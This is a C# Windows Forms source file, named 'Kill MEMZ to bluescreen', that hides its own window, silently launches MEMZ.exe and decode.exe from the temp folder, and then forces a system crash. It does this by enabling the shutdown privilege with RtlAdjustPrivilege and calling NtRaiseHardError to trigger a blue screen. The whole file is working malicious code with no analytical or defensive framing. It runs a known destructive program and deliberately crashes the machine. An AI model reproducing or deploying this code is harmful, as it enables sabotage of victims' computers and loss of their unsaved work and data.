using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace Kill_MEMZ_to_bluescreen
{
    public partial class kill_memz_to_bluescreen : Form
    {
        private static uint STATUS_ASSERTION_FAILURE = 0xC0000350;
        public kill_memz_to_bluescreen()
        {
            InitializeComponent();
        }
        private void kill_memz_to_bluescreen_Load(object sender, EventArgs e)
        {
            string temp = Path.GetTempPath();
            this.Hide();

            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = temp+"MEMZ.exe";
            p.SynchronizingObject = this;
            p.Exited += new EventHandler(p_Exited);
            p.EnableRaisingEvents = true;
            p.Start();
        }
        private void p_Exited(object sender, EventArgs e)
        {
            string temp = Path.GetTempPath();
            Process.Start(temp + "decode.exe");
            {
                bsod.Start();
            }
        }
            [DllImport("ntdll.dll")]
            private static extern uint RtlAdjustPrivilege(
       int Privilege,
       bool bEnablePrivilege,
       bool IsThreadPrivilege,
       out bool PreviousValue
  );
            [DllImport("ntdll.dll")]
            private static extern uint NtRaiseHardError(
                uint ErrorStatus,
                uint NumberOfParameters,
                uint UnicodeStringParameterMask,
                IntPtr Parameters,
                uint ValidResponseOption,
                out uint Response
            );

        private void bsod_Tick(object sender, EventArgs e)
        {
            bsod.Stop();
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
    }
    }
